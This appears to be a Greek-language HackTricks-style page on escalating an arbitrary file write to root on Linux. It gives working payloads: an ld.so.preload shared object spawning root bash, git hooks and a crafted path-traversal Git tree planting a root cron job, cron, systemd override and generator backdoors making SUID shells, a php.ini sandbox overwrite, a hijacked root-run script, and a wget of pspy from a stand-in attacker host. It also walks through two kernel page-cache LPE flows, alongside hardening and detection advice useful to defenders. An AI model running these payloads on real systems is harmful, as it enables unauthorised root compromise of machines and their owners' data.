# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Το `/etc/ld.so.preload` είναι μια λίστα shared objects σε επίπεδο συστήματος, τα οποία ο dynamic linker φορτώνει πριν από άλλα shared objects. Η λειτουργία secure-execution εφαρμόζει επιπλέον περιορισμούς στο preloading, επομένως μια διαδρομή βιβλιοθήκης όπως η `/tmp/pe.so` δεν αποτελεί καθολική τεχνική για SUID-binary.\
Αν μπορείτε να το δημιουργήσετε ή να το τροποποιήσετε, μια διεργασία που φορτώνει το αρχείο θα φορτώσει τη βιβλιοθήκη που αναφέρεται σε αυτό πριν από τα υπόλοιπα shared objects, επιτρέποντας την εκτέλεση κώδικα στο context της συγκεκριμένης διεργασίας.<sup>[[12]](#references)</sup>

Για παράδειγμα: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

Τα **Git hooks** είναι εκτελέσιμα scripts που εκτελούνται για events σε ένα repository, συμπεριλαμβανομένων των ενεργειών commit και merge. Αν ένα **privileged script ή user** εκτελεί αυτές τις ενέργειες και ένας attacker μπορεί να **γράψει στον φάκελο `.git`**, το hook μπορεί να χρησιμοποιηθεί για **privilege escalation**.<sup>[[13]](#references)</sup>

Για παράδειγμα, είναι δυνατό να **δημιουργηθεί ένα script** σε ένα git repo μέσα στο **`.git/hooks`**, ώστε να εκτελείται πάντα όταν δημιουργείται ένα νέο commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Path traversal σε εξαγωγή Git tree με privileged δικαιώματα

Ένας privileged synchronizer μπορεί να παρακάμπτει ένα checkout και, αντί γι' αυτό, να απαριθμεί ένα repository που επηρεάζεται από τον attacker με `git ls-tree`, να διαβάζει κάθε blob με `git cat-file`, να συνενώνει το αναφερόμενο pathname με έναν staging directory και να εκτελεί ο ίδιος την εγγραφή. Αυτό μετατρέπεται σε **arbitrary file write με τα privileges του synchronizer** όταν συνδυάζει το `-c safe.directory=*` (απενεργοποιώντας το Git guard για repository με διαφορετικό owner) με την απουσία ελέγχου containment του προορισμού. Ένα absolute tree-entry name κάνει το Python `os.path.join(stage, name)` να απορρίπτει το `stage`, ενώ ένα relative name που περιέχει `../` διαφεύγει όταν το filesystem το επιλύει. Επειδή η εφαρμογή υλοποιεί το raw tree αντί να ζητά από το Git να το κάνει checkout, η απόρριψη pathname κατά το checkout δεν προστατεύει ποτέ το sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Αναζητήστε αυτό το μοτίβο κώδικα σε root services, timers, deployment agents, template importers και backup/restore jobs:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Μια καταχώριση tree κωδικοποιείται ως `<mode> SP <name> NUL <raw object ID>`. Η επιλογή `git hash-object --literally` επιτρέπει σκόπιμα δεδομένα object που η κανονική ανάλυση ή το `git fsck` ενδέχεται να απορρίψουν, επομένως ένα disposable clone μπορεί να κατασκευάσει ένα tree του οποίου το filename είναι ένας απόλυτος προορισμός. Αυτό το παράδειγμα δημιουργεί ένα blob αρχείου cron, περικλείει το crafted tree σε ένα commit και μετακινεί ένα branch σε αυτό· η εκμετάλλευση εξακολουθεί να απαιτεί δικαίωμα ενημέρωσης ενός repository που χρησιμοποιείται από το privileged job και έναν Git server που αποδέχεται το malformed object.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Η σκλήρυνση πρέπει να καλύπτει τόσο την εισαγωγή από repositories όσο και την τελική λειτουργία στο filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Αντικαταστήστε το `safe.directory=*` με τα ακριβή repositories που πρέπει να εμπιστεύεται η υπηρεσία και εκτελέστε την επεξεργασία των repositories χωρίς root privileges όπου είναι δυνατό.
- Απορρίψτε απόλυτα ονόματα και οποιοδήποτε στοιχείο `.` ή `..` πριν από το materialization. Μετά την ένωση, κάντε canonicalize και επαληθεύστε ότι ο προορισμός παραμένει κάτω από το προβλεπόμενο root.
- Αποφύγετε τα symlink races τύπου check-then-open: ανοίξτε relative σε έναν έμπιστο directory descriptor και, σε Linux, χρησιμοποιήστε `openat2()` με `RESOLVE_BENEATH` και `RESOLVE_NO_SYMLINKS` για paths που ελέγχονται από attacker.
- Προτιμήστε ένα κανονικό checkout σε isolated directory αντί να επανυλοποιήσετε το checkout από plumbing output. Αν απαιτείται raw-object ingestion, ενεργοποιήστε validation στην πλευρά του receive, όπως `receive.fsckObjects=true`· μην υποβαθμίζετε τα pathname-related findings του `receive.fsck.*` που απαιτούνται για την απόρριψη crafted trees.

### Cron & Time files

Αν μπορείτε να **γράψετε cron-related αρχεία που εκτελεί το root**, συνήθως μπορείτε να επιτύχετε code execution την επόμενη φορά που θα εκτελεστεί το job. Ενδιαφέροντες στόχοι περιλαμβάνουν:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Το crontab του root στο `/var/spool/cron/` ή στο `/var/spool/cron/crontabs/`
- `systemd` timers και τα services που ενεργοποιούν

Γρήγοροι έλεγχοι:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Τυπικές διαδρομές abuse:

- **Προσθήκη μιας νέας root cron job** στο `/etc/crontab` ή σε ένα αρχείο στο `/etc/cron.d/`
- **Αντικατάσταση ενός script** που εκτελείται ήδη από το `run-parts`
- **Backdoor σε έναν υπάρχοντα προορισμό timer** τροποποιώντας το script ή το binary που εκκινεί

Ελάχιστο παράδειγμα cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Αν μπορείτε να γράψετε μόνο μέσα σε έναν κατάλογο cron που χρησιμοποιείται από το `run-parts`, τοποθετήστε εκεί ένα εκτελέσιμο αρχείο:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- Το `run-parts` συνήθως αγνοεί filenames που περιέχουν τελείες, επομένως προτιμήστε ονόματα όπως `backup` αντί για `backup.sh`.<sup>[[15]](#references)</sup>
- Ορισμένα συστήματα χρησιμοποιούν timers του `systemd` αντί για το κλασικό cron, αλλά η ιδέα του abuse είναι η ίδια: **τροποποιήστε αυτό που θα εκτελέσει αργότερα ο root**.<sup>[[20]](#references)</sup>

### Αρχεία Service & Socket

Αν μπορείτε να γράψετε **αρχεία unit του `systemd`** ή αρχεία που αναφέρονται από αυτά, ενδέχεται να μπορείτε να πετύχετε code execution ως root κάνοντας reload και restart στο unit ή περιμένοντας να ενεργοποιηθεί η διαδρομή ενεργοποίησης του service/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Ενδιαφέροντες στόχοι περιλαμβάνουν:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides στο `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries που αναφέρονται από τα `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable paths του `EnvironmentFile=` που φορτώνονται από ένα root service

Γρήγοροι έλεγχοι:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Συνήθεις διαδρομές abuse:

- **Overwrite `ExecStart=`** σε ένα service unit ιδιοκτησίας του root που μπορείτε να τροποποιήσετε
- **Add a drop-in override** με ένα malicious `ExecStart=` και κάντε πρώτα clear το παλιό
- **Backdoor το script/binary** που αναφέρεται ήδη από το unit
- **Hijack ένα socket-activated service** τροποποιώντας το αντίστοιχο αρχείο `.service`, το οποίο ξεκινά όταν το socket λάβει μια σύνδεση

Παράδειγμα malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Τυπική ροή ενεργοποίησης:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Αν δεν μπορείτε να κάνετε restart σε services μόνοι σας, αλλά μπορείτε να επεξεργαστείτε ένα socket-activated unit, ίσως χρειάζεται μόνο να **περιμένετε μια σύνδεση client** για να ενεργοποιηθεί η εκτέλεση του backdoored service ως root.<sup>[[17]](#references)</sup>

### Κατάλογοι systemd generators

Οι **System generators** είναι executables που εκκινούνται από τον system manager πριν φορτώσει τα unit files, τόσο κατά το boot όσο και κατά τα configuration reloads. Επομένως, write access σε έναν system-generator directory (ή σε έναν υπάρχοντα executable generator) αποτελεί άμεσο primitive για εκτέλεση κώδικα ως root, το οποίο εύκολα παραβλέπεται όταν ένας έλεγχος εξετάζει μόνο αρχεία `*.service` και `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Η συνήθης σειρά αναζήτησης είναι `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` και `/usr/lib/systemd/system-generators/` (ορισμένες distributions εκθέτουν το `/lib/systemd/system-generators/` μέσω του `/usr` merge). Ένα executable με το ίδιο όνομα σε έναν προηγούμενο directory κάνει shadowing στο αντίστοιχο που βρίσκεται αργότερα. Μην συγχέετε αυτούς τους **input executable directories** με τα `/run/systemd/generator`, `/run/systemd/generator.early` και `/run/systemd/generator.late`, τα οποία περιέχουν transient unit output που παράγεται από generators.<sup>[[35]](#references)</sup>

Γρήγοροι έλεγχοι:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
Ένα νεοδημιουργημένο generator πρέπει να έχει ενεργοποιημένο το executable bit. Αν το write primitive ελέγχει τα bytes αλλά όχι το mode, στόχευσε ένα generator που είναι ήδη executable· η περικοπή του επιτόπου συνήθως διατηρεί τα metadata του. Αν ο ίδιος ο κατάλογος είναι writable, δημιούργησε μια νέα entry και κάν’ την executable.<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
Η εκτέλεση του `systemctl daemon-reload` στον **system** manager απαιτεί κατάλληλη εξουσιοδότηση, αλλά εκτελεί ξανά κάθε system generator· διαφορετικά, περιμένετε ένα privileged reload, μια λειτουργία package ή μια reboot. Οι κατάλογοι user-generator, όπως `~/.config/systemd/user-generators/`, εκτελούνται υπό τον user manager και από μόνοι τους **δεν** παρέχουν root.<sup>[[35]](#references)</sup>

Για hardening και hunting, επαληθεύστε κάθε στοιχείο διαδρομής και ACL, αντί να ελέγχετε μόνο τα τελικά mode bits, δημιουργήστε baseline hashes/package ownership των generators και ενεργοποιήστε alert για create, rename, content ή permission changes σε όλους τους system-generator input directories. Η παρακολούθηση του write είναι σημαντική, επειδή ένας one-shot generator μπορεί να διαγράψει τον εαυτό του μετά την εκτέλεση, ενώ το generated unit tree κάτω από το `/run/systemd/generator*` δημιουργείται ξανά στο επόμενο reload.<sup>[[35]](#references)[[36]](#references)</sup>

### Αντικατάσταση ενός restrictive `php.ini` που χρησιμοποιείται από ένα privileged PHP sandbox

Ορισμένοι custom daemons επικυρώνουν PHP που παρέχεται από τον χρήστη, εκτελώντας το `php` με ένα **restricted `php.ini`** (για παράδειγμα, `disable_functions=exec,system,...`). Αν ο sandboxed κώδικας εξακολουθεί να διαθέτει **οποιοδήποτε write primitive** (όπως `file_put_contents`) και μπορείτε να προσπελάσετε το **ακριβές path του `php.ini`** που χρησιμοποιεί ο daemon, μπορείτε να **αντικαταστήσετε αυτό το config** για να άρετε τους περιορισμούς και έπειτα να υποβάλετε ένα δεύτερο payload που εκτελείται με elevated privileges.<sup>[[2]](#references)</sup>

Τυπική ροή:

1. Το πρώτο payload αντικαθιστά το sandbox config.
2. Το δεύτερο payload εκτελεί κώδικα, τώρα που οι dangerous functions έχουν ενεργοποιηθεί ξανά.

Ελάχιστο παράδειγμα (αντικαταστήστε το path που χρησιμοποιεί ο daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Εάν ο daemon εκτελείται ως root (ή επικυρώνει χρησιμοποιώντας διαδρομές που ανήκουν στον root), η δεύτερη εκτέλεση παρέχει ένα root context. Αυτό είναι ουσιαστικά **privilege escalation μέσω overwrite του config**, όταν το sandboxed runtime μπορεί ακόμη να γράφει αρχεία.

### binfmt_misc

Το `binfmt_misc` εκθέτει registrations κάτω από το `/proc/sys/fs/binfmt_misc`· κάθε registration συσχετίζει ένα μοτίβο τύπου αρχείου με έναν interpreter. Ο αντίκτυπος στα privileges εξαρτάται από το ποιος μπορεί να αλλάξει το registration και από το ποια διεργασία εκτελεί αργότερα το αρχείο που ταιριάζει, επομένως επαληθεύστε αυτές τις προϋποθέσεις πριν το θεωρήσετε πιθανή διαδρομή privilege escalation.<sup>[[21]](#references)</sup>

### Overwrite handlers σχημάτων (όπως http: ή https:)

Τα Desktop environments χρησιμοποιούν MIME associations και desktop entries για να επιλέξουν μια εφαρμογή για URI schemes· ένας attacker που μπορεί να γράψει στους σχετικούς per-user καταλόγους configuration και desktop entries μπορεί να ανακατευθύνει αυτά τα schemes σε έναν launcher που ελέγχει. Τροποποιώντας το αρχείο `$HOME/.config/mimeapps.list` ώστε οι HTTP και HTTPS URL handlers να δείχνουν σε ένα malicious αρχείο (για παράδειγμα, `x-scheme-handler/http=evil.desktop` και `x-scheme-handler/https=evil.desktop`), ένα click του user μπορεί να καλέσει αυτό το desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Εκτέλεση από Root scripts/binaries με δυνατότητα εγγραφής από τον χρήστη

Αν ένα privileged workflow εκτελεί κάτι όπως `/bin/sh /home/username/.../script` (ή οποιοδήποτε binary μέσα σε directory που ανήκει σε unprivileged user), μπορείτε να το hijack:<sup>[[1]](#references)</sup>

- **Εντοπισμός της εκτέλεσης:** παρακολουθήστε τις processes με pspy για να εντοπίσετε το Root να καλεί paths που ελέγχονται από τον χρήστη.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Επιβεβαίωση δυνατότητας εγγραφής:** βεβαιώσου ότι τόσο το target file όσο και ο κατάλογός του ανήκουν στον χρήστη σου και είναι writable.
- **Hijack του target:** δημιούργησε backup του αρχικού binary/script και τοποθέτησε ένα payload που δημιουργεί ένα SUID shell (ή οποιαδήποτε άλλη ενέργεια ως root) και, στη συνέχεια, επανάφερε τα permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Ενεργοποιήστε την privileged ενέργεια** (π.χ. πατώντας ένα UI button που εκκινεί το helper). Όταν το root εκτελέσει ξανά το hijacked path, αποκτήστε το escalated shell με `./rootshell -p`.

### Τροποποίηση privileged binaries μόνο στο page cache

Ορισμένα kernel bugs δεν τροποποιούν το αρχείο **στον δίσκο**. Αντίθετα, σας επιτρέπουν να τροποποιήσετε μόνο το **αντίγραφο στο page cache** ενός αναγνώσιμου αρχείου. Αν μπορείτε να στοχεύσετε ένα **setuid** ή άλλο binary που εκτελείται από το **root**, η επόμενη εκτέλεση μπορεί να εκτελέσει bytes που ελέγχει ο attacker από τη μνήμη και να κάνει escalate τα privileges, παρότι το file hash στον δίσκο παραμένει αμετάβλητο.<sup>[[3]](#references)[[4]](#references)</sup>

Αυτό είναι χρήσιμο να το θεωρείτε ως ένα **runtime-only file write primitive**:<sup>[[3]](#references)</sup>

- **Ο δίσκος παραμένει καθαρός**: το inode και τα bytes στον δίσκο δεν αλλάζουν
- **Η μνήμη είναι dirty**: οι διεργασίες που διαβάζουν ή εκτελούν τη cached page λαμβάνουν το περιεχόμενο που τροποποίησε ο attacker
- **Το αποτέλεσμα είναι προσωρινό**: η αλλαγή εξαφανίζεται μετά από reboot ή cache eviction

Αυτό το primitive βρίσκεται ανάμεσα στο κλασικό **arbitrary file write** και σε παλαιότερα bugs **page-cache abuse**, όπως τα Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Το Dirty COW βασιζόταν σε race
- Το Dirty Pipe είχε περιορισμούς στη θέση εγγραφής
- Ένα page-cache-only primitive μπορεί να είναι πιο αξιόπιστο, αν το vulnerable path επιτρέπει direct writes σε cached file-backed pages

#### Generic privesc flow

1. Αποκτήστε ένα kernel primitive που μπορεί να γράψει σε **file-backed page cache pages**
2. Χρησιμοποιήστε το εναντίον ενός **readable privileged binary** ή άλλου αρχείου που εκτελείται από το root
3. Ενεργοποιήστε την εκτέλεση **πριν** γίνει eviction της page από το cache
4. Αποκτήστε code execution ως root, ενώ το αρχείο στον δίσκο εξακολουθεί να φαίνεται μη τροποποιημένο

Τυπικοί high-value στόχοι:

- **setuid-root** binaries
- Helpers που εκκινούνται από **root services**
- Binaries που εκτελούνται συχνά από **containers που μοιράζονται το host kernel/page cache**

#### AF_ALG + `splice()` example path

Το Copy Fail (CVE-2026-31431) είναι καλό παράδειγμα αυτής της κατηγορίας. Το vulnerable path βρισκόταν στο Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- Το `splice()` μπορεί να μετακινήσει references σε page-cache pages από ένα readable file στο crypto TX scatterlist
- το in-place `algif_aead` decrypt path επαναχρησιμοποιούσε τα source και destination buffers
- το `authencesn` έγραφε στη destination tag region
- όταν αυτή η region εξακολουθούσε να αναφέρεται σε spliced file-backed pages, η εγγραφή κατέληγε στο **page cache του target file**

Επομένως, η ενδιαφέρουσα τεχνική δεν είναι το ίδιο το CVE, αλλά το pattern:

- **τροφοδοτήστε file-backed cache pages σε ένα kernel subsystem**
- κάντε το subsystem να τις **αντιμετωπίσει ως writable output**
- ενεργοποιήστε ένα μικρό, ελεγχόμενο overwrite στη μνήμη

Το public PoC χρησιμοποιούσε επαναλαμβανόμενα **4-byte writes** για να κάνει patch το `/usr/bin/su` στη μνήμη και στη συνέχεια το εκτελούσε.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

Το DirtyClone (CVE-2026-43503) παρουσιάζει μια ακόμη παραλλαγή του ίδιου pattern **page-cache-only write-to-root**, αλλά αυτή τη φορά το sink είναι το **IPsec ESP decrypt** αντί για το `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Η σημαντική τεχνική είναι το βήμα **metadata-laundering**:

- Το `splice()` τοποθετεί μια **read-only file-backed page-cache page** σε ένα ESP-in-UDP packet
- το αρχικό DirtyFrag mitigation έκανε tag το skb με `SKBFL_SHARED_FRAG`, ώστε το `esp_input()` να κάνει **copy πριν από το decrypt**
- το netfilter `TEE` αντιγράφει το packet μέσω των `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- το clone διατηρεί το **ίδιο physical page-cache reference**, αλλά χάνει το `SKBFL_SHARED_FRAG`
- το `esp_input()` θεωρεί τότε το clone ασφαλές και εκτελεί **in-place `cbc(aes)` decrypt** πάνω στη file-backed page

Επομένως, το μάθημα για τον reviewer είναι ευρύτερο από το ίδιο το CVE: αν ένα mitigation βασίζεται σε **skb/page metadata** για να αποφασίσει αν μια λειτουργία πρέπει πρώτα να κάνει copy, οποιοδήποτε **clone/copy path που διατηρεί το backing page αλλά απορρίπτει τα metadata** μπορεί να ανοίξει ξανά αθόρυβα το write primitive.

Τυπικό exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` για να αποκτήσετε **`CAP_NET_ADMIN` μέσα σε ένα private network namespace**
2. ενεργοποιήστε το loopback και εγκαταστήστε έναν **netfilter `TEE` rule** στο `mangle/OUTPUT`
3. εγκαταστήστε **XFRM ESP transport SAs** μέσω του `NETLINK_XFRM`
4. κωδικοποιήστε κάθε target 4-byte word στο πεδίο `seq_hi` του SA (το word-selection trick του DirtyFrag)
5. στείλτε το spliced ESP-in-UDP packet, ώστε το **TEE clone** να φτάσει στο `esp_input()` και να κάνει decrypt **in place**
6. επαναλάβετε μέχρι το page-cache αντίγραφο του `/usr/bin/su` ή κάποιου άλλου privileged executable να περιέχει code που ελέγχει ο attacker

Σε επίπεδο λειτουργίας, το impact είναι ίδιο με αυτό του `AF_ALG` example: το αρχείο στον δίσκο παραμένει καθαρό, αλλά το `execve()` χρησιμοποιεί τα **mutated page-cache bytes** και αποδίδει root.<sup>[[8]](#references)[[9]](#references)</sup>

Χρήσιμοι έλεγχοι έκθεσης για αυτή την παραλλαγή:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Η βραχυπρόθεσμη μείωση του attack surface είναι και εδώ path-specific: η αναβάθμιση σε kernel που περιλαμβάνει το `48f6a5356a33` διορθώνει το clone path, ενώ ο αποκλεισμός του autoload του `xt_TEE` αφαιρεί το **flag-laundering step** και ο αποκλεισμός των `esp4` / `esp6` αφαιρεί το **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Έκθεση και hunting

Αν υποψιάζεστε αυτή την κατηγορία bug, μην βασίζεστε μόνο σε ελέγχους ακεραιότητας του δίσκου. Επαληθεύστε επίσης:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Οι παρακάτω τιμές ρυθμίσεων διακρίνουν ένα loadable interface από ένα ενσωματωμένο στον kernel· οι crypto build rules αντιστοιχίζουν το `CONFIG_CRYPTO_USER_API_AEAD` στο `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: το `algif_aead` μπορεί να φορτώνεται/αφαιρείται ως module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: το interface είναι ενσωματωμένο στον kernel
- τα setuid binaries είναι καλοί στόχοι, επειδή ένα patch που αφορά μόνο το page cache μπορεί να αρκεί για τη μετατροπή ενός local foothold σε root

#### Μείωση του attack surface για τη διαδρομή `algif_aead`

Αν το vulnerable interface παρέχεται από loadable module:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Εάν έχει μεταγλωττιστεί στον kernel, ορισμένες disclosures ανέφεραν τον αποκλεισμό του init path με:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Αυτό το είδος mitigation αξίζει να το θυμάστε και για άλλα kernel LPE: αν η exploitation εξαρτάται από ένα συγκεκριμένο optional interface, η απενεργοποίηση ή το blacklisting αυτού του interface μπορεί να διακόψει το exploit path ακόμη και πριν καταστεί διαθέσιμο ένα πλήρες kernel upgrade.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – hijacking ενός script που εκτελείται ως root σε κατάλογο PaperCut εγγράψιμο από τον χρήστη](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Συχνές ερωτήσεις για το Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Αποκάλυψη του Openwall oss-security για το CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - Επαναφορά σε λειτουργία out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory για το CVE-2026-31431](https://copy.fail/)
- [7] [Τεχνική ανάλυση των Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repository / README του DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Ανάλυση και exploitation του Linux LPE variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: διατήρηση του `SKBFL_SHARED_FRAG` στο `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Προηγούμενο Linux mitigation: ορισμός του `SKBFL_SHARED_FRAG` για spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — σελίδα εγχειριδίου Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Τεκμηρίωση του Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Συσχετίσεις εφαρμογών MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Προδιαγραφή Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Προδιαγραφή Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Γλώσσα Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Ευπάθεια page cache του Linux kernel AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Τεκμηρίωση του Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Τεκμηρίωση του Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Τεκμηρίωση ρυθμίσεων του Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Τεκμηρίωση generator του systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: μηχανισμοί persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
